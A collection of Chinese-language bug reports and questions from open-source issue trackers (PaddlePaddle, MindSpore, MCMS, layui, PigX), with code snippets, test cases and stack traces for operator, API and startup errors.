LoDTensor in operators.,"关于在operator里的用法，合入https://github.com/PaddlePaddle/Paddle/pull/4083 之后， 对于非sequence operators使用，需要注意： 只需要在里对输出用: Input以及operator kernel里还可继续用。 用举例： SigmoidKernel: 有同学觉得一些地方使用, 一些地方用，这样有点晕，大家怎么看？ 如果要改的话，有两种方式： 所有operator的任何地方都用，（王益老师也强调，是我们的一个特点） 会导致所有operators，即使非sequence operators，任何地方都感知. 函数对Tensor特化，始终使用: 会导致通过永远无法在scope里创造出. 大家有什么建议吗？   <code>: LoDTensor InferShape Output&lt;framework::LoDTensor&gt; Tensor SigmoidOp class SigmoidOp : public framework::OperatorWithKernel { public: using framework::OperatorWithKernel::OperatorWithKernel; protected: void InferShape(const framework::InferShapeContext &amp;ctx) const override { PADDLE_ENFORCE_NOT_NULL(ctx.InputVar(""X""), ""Input(X) of SigmoidOp should not be null.""); PADDLE_ENFORCE_NOT_NULL(ctx.OutputVar(""Y""), ""Output(Y) of SigmoidOp should not be null.""); ctx.Output&lt;framework::LoDTensor&gt;(""Y"")-&gt;Resize( ctx.Input&lt;Tensor&gt;(""X"")-&gt;dims()); } }; template &lt;typename Place, typename T&gt; class SigmoidKernel : public framework::OpKernel { public: void Compute(const framework::ExecutionContext&amp; context) const override { auto input = context.Input&lt;Tensor&gt;(""X""); auto output = context.Output&lt;Tensor&gt;(""Y""); output-&gt;mutable_data&lt;T&gt;(context.GetPlace()); // The clipping is used in Paddle's raw implenmention auto X = EigenVector&lt;T&gt;::Flatten(*input); auto Y = EigenVector&lt;T&gt;::Flatten(*output); auto place = context.GetEigenDevice&lt;Place&gt;(); Y.device(place) = 1. / (1. + (-X).exp()); } }; LoDTensor Tensor LoDTenor LoDTensor LoDTensor InferShapeContext::Output&lt;T&gt;(const std::string&amp; name) GetMutable&lt;LoDTensor&gt; LoDTensor InferShapeContext::Output&lt;Tensor&gt;() Tensor template &lt;&gt; Tensor* ExecutionContext::Output&lt;Tensor&gt;(const std::string&amp; name) const { auto* var = OutputVar(name); return var == nullptr ? nullptr : var-&gt;GetMutable&lt;LoDTensor&gt;(); }"
[CT][MS][OCCM][SparseFillEmptyRows] 算子在ascend上合入之后出现valueerror,"算子 在ascend上出现报错，运行用例 def test_p_sparsefillemptyrows_dtype_float32(): n = np.random.randint(10, 20) dim1 = np.random.randint(1, n) input_list = [] indices = Tensor(np.random.randint(n, size=(dim1, 2)), dtype=mstype.int64) values = Tensor(dim1 * np.random.rand(dim1), dtype=mstype.float32) dense_shape = Tensor([n, n], dtype=mstype.int64) default_value = Tensor(dim1, dtype=mstype.float32) input_list.append(indices) input_list.append(values) input_list.append(dense_shape) input_list.append(default_value) fact = SparseFillEmptyRowsMock(inputs=input_list) fact.forward_cmp() test_sparsefillemptyrows.py:52: ../share/ops/primitive/sparsefillemptyrows_ops.py:128: in grad_cmp input_grad_mindspore = self.grad_mindspore_impl() ../share/ops/primitive/sparsefillemptyrows_ops.py:91: in grad_mindspore_impl Tensor(self.default_value), dout_grad) /root/archiconda3/envs/nisong3.73/lib/python3.7/site-packages/mindspore/nn/cell.py:630: in call out = self.compile_and_run(*args) /root/archiconda3/envs/nisong3.73/lib/python3.7/site-packages/mindspore/nn/cell.py:950: in compile_and_run self.compile(*inputs) /root/archiconda3/envs/nisong3.73/lib/python3.7/site-packages/mindspore/nn/cell.py:924: in compile jit_config_dict=self._jit_config_dict) self = &lt;mindspore.common.api._CellGraphExecutor object at 0xffff5f443450&gt; obj = GradOfAllInputs&lt; (network): WrapOp&lt;&gt; , phase = 'train.1668081649605939200.281469140087920.9' do_convert = True, jit_config_dict = {} args = (Tensor(shape=[6, 2], dtype=Int64, value= [[5, 4], [3, 0], [6, 9], [7, 0], [6, 8], [4, 1]]), Tensor(shape=[6], dt...e, True, True, True, True, True, True, True]), Tensor(shape=[6], dtype =Int64, value= [ 0, 0, 0, -2, 0, -1]))) 显示： test_sparsefillemptyrows.py::test_p_sparsefillemptyrows_dtype_float32_10000x10000 FAILED   <code>: fact.grad_cmp() def compile(self, obj, *args, phase='predict', do_convert=True, jit_config_dict=None): """""" Compiles graph. Args: obj (Function/Cell): The function or cell instance need compile. args (tuple): Function or cell input arguments. phase (str): The name of compile phase. Default: 'predict'. do_convert (bool): When set to True, convert ME graph to GE graph after compiling graph. jit_config_dict (dict): Jit config for compile. Default: None. Return: Str, the full phase of the cell. Bool, if the graph has been compiled before, return False, else return True. """""" obj.__parse_method__ = 'construct' if not hasattr(obj, obj.__parse_method__): raise AttributeError( 'The class {} dose not have method {}'.format(obj.__class__.__name__, obj.__parse_method__)) args_list = args self.enable_tuple_broaden = False if hasattr(obj, ""enable_tuple_broaden""): self.enable_tuple_broaden = obj.enable_tuple_broaden self._graph_executor.set_enable_tuple_broaden(self.enable_tuple_broaden) key = self._graph_executor.generate_arguments_key(args_list, self.enable_tuple_broaden) obj.arguments_key = str(key) phase = phase + '.' + str(obj.create_time) + '.' + str(id(obj)) + '.' + obj.arguments_key if phase in obj.compile_cache and self.has_compiled(phase): logger.debug(""%r graph has existed."", phase) return phase, False obj.check_names() _check_full_batch() self._set_dataset_mode(args_list) self._set_compile_cache_dep_files(phase) enable_ge = context.get_context(""enable_ge"") self._graph_executor.set_weights_values(obj.parameters_dict()) if jit_config_dict: self._graph_executor.set_jit_config(jit_config_dict) result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode())"
capi预测出core，当样本是dense_vector_sequence类型时，请教正确的调用方式,"问题：当输入样本是sequence，sequence中每一个元素是定长向量时，输入参数如何构造？sequence_start_pos如何构造？ 看capi的样例代码没有找到摸索到答案 输入样本类型： dense_vector_sequence(64) 相关代码： 出core日志： I0908 11:01:07.981760 22947 Util.cpp:166] commandline: I0908 11:01:07.983686 22947 GradientMachine.cpp:74] Loading parameters from ./model/param shape[9,64] F0908 11:01:07.984719 22947 Matrix.h:262] Check failed: startRow + numRows &lt;= getHeight() (10 vs. 9) *** Check failure stack trace: *** @ 0x7f3a3041287d google::LogMessage::Fail() @ 0x7f3a3041632c google::LogMessage::SendToLog() @ 0x7f3a304123a3 google::LogMessage::Flush() @ 0x7f3a3041783e google::LogMessageFatal::~LogMessageFatal() @ 0x7f3a302ad461 paddle::Matrix::subMatrix() @ 0x7f3a30297746 paddle::ContextProjectionForward&lt;&gt;() @ 0x7f3a3029b642 paddle::ContextProjectionForwardFunc&lt;&gt;::calc() @ 0x7f3a30157c0e paddle::ContextProjection::forward() @ 0x7f3a301ed41e paddle::MixedLayer::forward() @ 0x7f3a30289530 paddle::NeuralNetwork::forward() @ 0x7f3a301404e6 paddle_gradient_machine_forward @ 0x40321d main @ 0x7f3a2f16dbd5 __libc_start_main @ 0x403e99 (unknown) @ (nil) (unknown) Aborted (core dumped) gdb信息：   <code>: paddle_gradient_machine thread_local_machine; CHECK(paddle_gradient_machine_create_shared_param(_machine, _config_bin, _size, &amp;thread_local_machine)); gettimeofday(&amp;tv_begin, NULL); paddle_arguments in_args = paddle_arguments_create_none(); CHECK(paddle_arguments_resize(in_args, 1)); //paddle_matrix sentence = paddle_matrix_create(count, 64, useGPU); paddle_matrix sentence = paddle_matrix_create(1, count * 64, useGPU); for (int i = 0; i &lt; count; ++i) { CHECK(paddle_matrix_set_row(sentence, i, sep[i])); } CHECK(paddle_arguments_set_value(in_args, 0, sentence)); uint64_t h = 0; uint64_t w = 0; CHECK(paddle_matrix_get_shape(sentence, &amp;h, &amp;w)); fprintf(stderr, ""shape[%lu,%lu]\n"", h, w); // paddle input matrix end int seq_pos_array[] = {0, count}; paddle_ivector seq_pos = paddle_ivector_create(seq_pos_array, count, false, false); CHECK(paddle_arguments_set_sequence_start_pos(in_args, 0, 0, seq_pos)); // paddle sequence pos info end paddle_arguments out_args = paddle_arguments_create_none(); CHECK(paddle_gradient_machine_forward(thread_local_machine, in_args, out_args, false)); //predict end #0 0x00007f3a2f1813f7 in raise () from /home/opt/gcc-4.8.2.bpkg-r2/gcc-4.8.2.bpkg-r2/lib64/libc-2.18.so #1 0x00007f3a2f1827d8 in abort () from /home/opt/gcc-4.8.2.bpkg-r2/gcc-4.8.2.bpkg-r2/lib64/libc-2.18.so #2 0x00007f3a3041b715 in google::DumpStackTraceAndExit() () from /home/img/zongming/rs/dump_embdding_capi/libpaddle_capi_shared.so #3 0x00007f3a3041287d in google::LogMessage::Fail() () from /home/img/zongming/rs/dump_embdding_capi/libpaddle_capi_shared.so #4 0x00007f3a3041632c in google::LogMessage::SendToLog() () from /home/img/zongming/rs/dump_embdding_capi/libpaddle_capi_shared.so #5 0x00007f3a304123a3 in google::LogMessage::Flush() () from /home/img/zongming/rs/dump_embdding_capi/libpaddle_capi_shared.so #6 0x00007f3a3041783e in google::LogMessageFatal::~LogMessageFatal() () from /home/img/zongming/rs/dump_embdding_capi/libpaddle_capi_shared.so #7 0x00007f3a302ad461 in paddle::Matrix::subMatrix (this=0x7fff8f1541e0, startRow=9, numRows=1) at /home/yuyang/BuildAgent3/work/d55918cf60d51073/paddle/math/Matrix.h:262 #8 0x00007f3a30297746 in paddle::ContextProjectionForward&lt;(paddle::DeviceType)1&gt; (out_mat=..., input_mat=..., weight_mat=..., seq_vec=..., context_length=3, context_start=-1, begin_pad=1) at /home/yuyang/BuildAgent3/work/d55918cf60d51073/paddle/function/ContextProjectionOp.cpp:43 #9 0x00007f3a3029b642 in paddle::ContextProjectionForwardFunc&lt;(paddle::DeviceType)1&gt;::calc (this=0x4718f9b0, inputs=..., outputs=...) at /home/yuyang/BuildAgent3/work/d55918cf60d51073/paddle/function/ContextProjectionOp.cpp:140 #10 0x00007f3a30157c0e in paddle::ContextProjection::forward (this=0x47190200) at /home/yuyang/BuildAgent3/work/d55918cf60d51073/paddle/gserver/layers/ContextProjection.cpp:130 #11 0x00007f3a301ed41e in forward (passType=paddle::enumeration_wrapper::PASS_TEST, out=0x4718b878, in=&lt;optimized out&gt;, this=&lt;optimized out&gt;) at /home/yuyang/BuildAgent3/work/d55918cf60d51073/paddle/gserver/layers/Projection.h:69 #12 paddle::MixedLayer::forward (this=0x4718b6a0, passType=paddle::enumeration_wrapper::PASS_TEST) at /home/yuyang/BuildAgent3/work/d55918cf60d51073/paddle/gserver/layers/MixedLayer.cpp:126 #13 0x00007f3a30289530 in paddle::NeuralNetwork::forward (this=0x47181210, inArgs=..., outArgs=0x61ed98, passType=paddle::enumeration_wrapper::PASS_TEST) at /home/yuyang/BuildAgent3/work/d55918cf60d51073/paddle/gserver/gradientmachines/NeuralNetwork.cpp:250 #14 0x00007f3a301404e6 in paddle_gradient_machine_forward (machine=&lt;optimized out&gt;, inArgs=&lt;optimized out&gt;, outArgs=&lt;optimized out&gt;, isTrain=&lt;optimized out&gt;)"
[5.2.4]版本 发送邮件之后会出现如下错误,"在本地测试不会，但是部署到服务器上后就会这样。 本地和服务器上的短信模板都是一样的~   <code>: org.springframework.web.client.RestClientException: Error while extracting response for type [class com.alibaba.fastjson.JSONObject] and content type [application/json;charset=UTF-8]; nested exception is org.springframework.http.converter.HttpMessageNotReadableException: JSON parse error: Illegal character ((CTRL-CHAR, code 31)): only regular white space (\r, \n, \t) is allowed between tokens; nested exception is com.fasterxml.jackson.core.JsonParseException: Illegal character ((CTRL-CHAR, code 31)): only regular white space (\r, \n, \t) is allowed between tokens at [Source: (PushbackInputStream); line: 1, column: 2] at org.springframework.web.client.HttpMessageConverterExtractor.extractData(HttpMessageConverterExtractor.java:120) at org.springframework.web.client.RestTemplate$ResponseEntityResponseExtractor.extractData(RestTemplate.java:996) at org.springframework.web.client.RestTemplate$ResponseEntityResponseExtractor.extractData(RestTemplate.java:979) at org.springframework.web.client.RestTemplate.doExecute(RestTemplate.java:739) at org.springframework.web.client.RestTemplate.execute(RestTemplate.java:672) at org.springframework.web.client.RestTemplate.exchange(RestTemplate.java:581) at net.mingsoft.basic.util.RestTemplateUtil.post(RestTemplateUtil.java:278) at net.mingsoft.basic.util.RestTemplateUtil.post(RestTemplateUtil.java:234) at net.mingsoft.people.action.web.PeopleAction.sendCode(PeopleAction.java:542) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:190) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:105) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:878) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:792) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1040) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) at javax.servlet.http.HttpServlet.service(HttpServlet.java:665) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) at javax.servlet.http.HttpServlet.service(HttpServlet.java:750) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.AbstractShiroFilter.executeChain(AbstractShiroFilter.java:449) at org.apache.shiro.web.servlet.AbstractShiroFilter$1.call(AbstractShiroFilter.java:365) at org.apache.shiro.subject.support.SubjectCallable.doCall(SubjectCallable.java:90) at org.apache.shiro.subject.support.SubjectCallable.call(SubjectCallable.java:83) at org.apache.shiro.subject.support.DelegatingSubject.execute(DelegatingSubject.java:387) at org.apache.shiro.web.servlet.AbstractShiroFilter.doFilterInternal(AbstractShiroFilter.java:362) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at com.alibaba.druid.support.http.WebStatFilter.doFilter(WebStatFilter.java:123) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at net.mingsoft.basic.filter.XSSEscapeFilter.doFilter(XSSEscapeFilter.java:56) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:542) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:143) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:374) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:888) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1597) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:748) Caused by: org.springframework.http.converter.HttpMessageNotReadableException: JSON parse error: Illegal character ((CTRL-CHAR, code 31)): only regular white space (\r, \n, \t) is allowed between tokens; nested exception is com.fasterxml.jackson.core.JsonParseException: Illegal character ((CTRL-CHAR, code 31)): only regular white space (\r, \n, \t) is allowed between tokens at [Source: (PushbackInputStream); line: 1, column: 2] at org.springframework.http.converter.json.AbstractJackson2HttpMessageConverter.readJavaType(AbstractJackson2HttpMessageConverter.java:285) at org.springframework.http.converter.json.AbstractJackson2HttpMessageConverter.read(AbstractJackson2HttpMessageConverter.java:243) at org.springframework.web.client.HttpMessageConverterExtractor.extractData(HttpMessageConverterExtractor.java:105) ... 73 more Caused by: com.fasterxml.jackson.core.JsonParseException: Illegal character ((CTRL-CHAR, code 31)): only regular white space (\r, \n, \t) is allowed between tokens at [Source: (PushbackInputStream); line: 1, column: 2] at com.fasterxml.jackson.core.JsonParser._constructError(JsonParser.java:1840) at com.fasterxml.jackson.core.base.ParserMinimalBase._reportError(ParserMinimalBase.java:712) at com.fasterxml.jackson.core.base.ParserMinimalBase._throwInvalidSpace(ParserMinimalBase.java:690) at com.fasterxml.jackson.core.json.UTF8StreamJsonParser._skipWSOrEnd(UTF8StreamJsonParser.java:2979) at com.fasterxml.jackson.core.json.UTF8StreamJsonParser.nextToken(UTF8StreamJsonParser.java:716) at com.fasterxml.jackson.databind.ObjectMapper._initForReading(ObjectMapper.java:4356) at com.fasterxml.jackson.databind.ObjectMapper._readMapAndClose(ObjectMapper.java:4205) at com.fasterxml.jackson.databind.ObjectMapper.readValue(ObjectMapper.java:3267) at org.springframework.http.converter.json.AbstractJackson2HttpMessageConverter.readJavaType(AbstractJackson2HttpMessageConverter.java:274) ... 75 more"
通过top.layer.open打开的弹窗，点击table中某一行的省略号，单元格详情显示在遮罩层后面,"版本：3.6.8 描述：具体看图，好像是因为iframe导致的，请教解决方案，怎么才能让单元格详情正常显示在对应单元格上层 示例代码如下:   <code>: &lt;body&gt; &lt;div class=""nav-bar""&gt;&lt;/div&gt; &lt;div&gt; &lt;iframe&gt; ... &lt;button class=""layui-btn""&gt;打开layer&lt;/button&gt; ... &lt;/iframe&gt; &lt;/div&gt; &lt;/body&gt; &lt;script&gt; layui.use(() =&gt; { $('.layui-btn').click(e =&gt; { top.layer.open({ type: 1, title: ['标题', 'font-weight: bold'], content: `其他的html字符串... &lt;table id=""tableId"" lay-filter=""tableId""&gt;&lt;/table&gt; 其他的html字符串...`, success: (layero, index) =&gt; { layui.table.render({...}) // 可能是这里没有加 top 导致的 } }) }) }) &lt;/script&gt;"
[CT][MS][resizenearestneighborv2]ValueError Is Reported When the resizenearestneighborv2 and MaskedSelect Operator Is Executed in Pynative Mode,"resizenearestneighborv2算子多条用例在pynative模式执行报错ValueError / 硬件环境: /device ascend/CPU : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative test_p_resizenearestneighborv2_input_dtype_float16_4d test_p_resizenearestneighborv2_input_dtype_float32_4d test_p_resizenearestneighborv2_input_dtype_float64_4d test_p_resizenearestneighborv2_input_dtype_int16_4d test_p_resizenearestneighborv2_input_dtype_int32_4d test_p_resizenearestneighborv2_input_dtype_int64_4d test_p_resizenearestneighborv2_input_dtype_int8_4d test_p_resizenearestneighborv2_input_dtype_uint16_4d test_p_resizenearestneighborv2_input_dtype_uint8_4d test_p_maskedselect_4d_fp16 test_p_maskedselect_7d_int64 pytest -s test_resizenearestneighborv2.py pass   <code>: 问题1、 def test_p_resizenearestneighborv2_input_dtype_int8_4d(): input_list = [] x0 = Tensor(np.random.randint(-100, 100, size=(6, 11, 4, 11)).astype(np.int8)) input_list.append(x0) x1 = Tensor(np.random.randint(1, 100, size=2).astype(np.int32)) input_list.append(x1) attributes = {'align_corners': False, 'half_pixel_centers': True, 'data_format': 'NHWC'} fact = ResizeNearestNeighborV2Mock(attributes=attributes, inputs=input_list) fact.forward_cmp() &gt; fact.grad_cmp() ../operations/test_resizenearestneighborv2.py:40: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/resizenearestneighborv2_ops.py:109: in grad_cmp grads_pre = self.grad_mindspore_impl() ../share/ops/primitive/resizenearestneighborv2_ops.py:94: in grad_mindspore_impl grads_pre = grad_net(self.x, self.grad_in_size, grad_ms)[0] /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:651: in __call__ raise err /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:647: in __call__ output = self._run_construct(args, kwargs) /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:413: in _run_construct output = self.construct(*cast_inputs, **kwargs) ../share/grad.py:27: in construct return self.grad(self.network)(*inputs) /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/ops/composite/base.py:377: in after_grad return grad_(fn)(*args, **kwargs) /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/common/api.py:97: in wrapper results = fn(*arg, **kwargs) /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/ops/composite/base.py:366: in after_grad _pynative_executor.grad(fn, grad_, weights, self.grad_position, *args, **kwargs) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._PyNativeExecutor object at 0xffff918d7dd0&gt; obj = WrapOp&lt;&gt; grad = &lt;mindspore.ops.composite.base.GradOperation object at 0xffff669834d0&gt; weights = None, grad_position = (0,) args = (Tensor(shape=[6, 11, 4, 11], dtype=Int8, value= [[[[ -8, -11, 79 ... 74, 34, 66], [ -15, 57, 76 ... ... 0], [0, 0, 0 ... 0, 0, 0], ... [0, 0, 0 ... 0, 0, 0], [0, 0, 0 ... 0, 0, 0], [0, 0, 0 ... 0, 0, 0]]]])) kwargs = {} def grad(self, obj, grad, weights, grad_position, *args, **kwargs): """""" Get grad graph. Args: obj (Function/Cell): The function or cell instance. grad (GradOperation): The gradoperation object. weights (ParameterTuple): The weights of cell instance. grad_position (Union(int, tuple[int])): If int, get the gradient with respect to single input. If tuple, get the gradients with respect to selected inputs. 'grad_position' begins with 0. Default: 0. args (tuple): Function or cell input arguments. kwargs (dict): keyword arguments. Return: None. """""" &gt; self._executor.grad_net(grad, obj, weights, grad_position, *args, *(kwargs.values())) E ValueError: The shape should be (6, 11, 4, 11), but got (6, 32, 42, 11), @grad{3}.8:sens E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/pipeline/pynative/grad/grad.cc:547 CheckParamShapeAndType /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/common/api.py:1034: ValueError 问题2、 def test_p_maskedselect_4d_fp16(): x_np = np.random.randn(3, 7, 8, 9).astype(np.float16) x = Tensor(x_np) mask_np = x_np &gt; 0.5 mask = Tensor(mask_np) fact = MaskedSelectMock(inputs=[x, mask]) fact.forward_cmp() &gt; fact.grad_cmp() ../operations/test_maskedselect.py:70: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/maskedselect_ops.py:110: in grad_cmp out_mindspore = self.grad_mindspore_impl() ../share/ops/primitive/maskedselect_ops.py:68: in grad_mindspore_impl input_grad = grad_net(self.input_x, self.mask, Tensor(self.output_grad_np)) /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:651: in __call__ raise err /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:647: in __call__ output = self._run_construct(args, kwargs) /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:413: in _run_construct output = self.construct(*cast_inputs, **kwargs) ../share/grad.py:27: in construct return self.grad(self.network)(*inputs) /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/ops/composite/base.py:377: in after_grad return grad_(fn)(*args, **kwargs) /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/common/api.py:97: in wrapper results = fn(*arg, **kwargs) /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/ops/composite/base.py:366: in after_grad _pynative_executor.grad(fn, grad_, weights, self.grad_position, *args, **kwargs) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._PyNativeExecutor object at 0xffffa7fa33d0&gt; obj = WrapOp&lt;&gt; grad = &lt;mindspore.ops.composite.base.GradOperation object at 0xffff77ec0890&gt; weights = None, grad_position = (0,) args = (Tensor(shape=[3, 7, 8, 9], dtype=Float16, value= [[[[ 2.2246e+00, -1.2903e-01, 3.6304e-01 ... 7.4463e-02, 1.3733e-...2.2539e+00, 8.7793e-01, 1.4268e+00, 1.0615e+00, 5.3418e-01, 1.1152e+00, 9.5801e-01, 8.3984e-01, 7.6270e-01])) kwargs = {} def grad(self, obj, grad, weights, grad_position, *args, **kwargs): """""" Get grad graph. Args: obj (Function/Cell): The function or cell instance. grad (GradOperation): The gradoperation object. weights (ParameterTuple): The weights of cell instance. grad_position (Union(int, tuple[int])): If int, get the gradient with respect to single input. If tuple, get the gradients with respect to selected inputs. 'grad_position' begins with 0. Default: 0. args (tuple): Function or cell input arguments. kwargs (dict): keyword arguments. Return: None. """""" &gt; self._executor.grad_net(grad, obj, weights, grad_position, *args, *(kwargs.values())) E TypeError: The dtype should be Tensor[Float32], but got Tensor[Float16], @grad{3}.7:sens E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/pipeline/pynative/grad/grad.cc:555 CheckParamShapeAndType /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/common/api.py:1034: TypeError"
3.2新包【Admin模块】启动PigxAdminApplication服务报错,pigx版本: 3.2 操作系统: win10 是否修改包名: 否 此描述属于上述哪个等级:A级 蠢问题 按照顺序正常启动 PigxNacosApplication PigxGatewayApplication PigxAuthApplication PigxAdminApplication 然后启动 PigxAdminApplication服务报错   <code>: attempt: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'documentationPluginsBootstrapper' defined in URL [jar:file:/E:/test_mvn_pigx/io/springfox/springfox-spring-web/2.9.2/springfox-spring-web-2.9.2.jar!/springfox/documentation/spring/web/plugins/DocumentationPluginsBootstrapper.class]: Unsatisfied dependency expressed through constructor parameter 1; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'webMvcRequestHandlerProvider' defined in URL [jar:file:/E:/test_mvn_pigx/io/springfox/springfox-spring-web/2.9.2/springfox-spring-web-2.9.2.jar!/springfox/documentation/spring/web/plugins/WebMvcRequestHandlerProvider.class]: Unsatisfied dependency expressed through constructor parameter 1; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'requestMappingHandlerMapping' defined in class path resource [org/springframework/boot/autoconfigure/web/servlet/WebMvcAutoConfiguration$EnableWebMvcConfiguration.class]: Invocation of init method failed; nested exception is java.lang.IllegalStateException: Ambiguous mapping. Cannot map 'sysClientController' method public com.pig4cloud.pigx.common.core.util.R com.pig4cloud.pigx.admin.controller.SysClientController.add(com.pig4cloud.pigx.admin.api.entity.SysOauthClientDetails) to {POST /client}: There is already 'oauthClientDetailsController' bean method public com.pig4cloud.pigx.common.core.util.R com.pig4cloud.pigx.admin.controller.OauthClientDetailsController.add(com.pig4cloud.pigx.admin.api.entity.SysOauthClientDetails) mapped. 2019-08-02 00:05:42.574 INFO 11484 --- [ main] com.alibaba.druid.pool.DruidDataSource : {dataSource-1} closing ... 2019-08-02 00:05:42.590 INFO 11484 --- [ main] com.alibaba.druid.pool.DruidDataSource : {dataSource-1} closed 2019-08-02 00:05:42.621 INFO 11484 --- [ main] ConditionEvaluationReportLoggingListener : Error starting ApplicationContext. To display the conditions report re-run your application with 'debug' enabled. 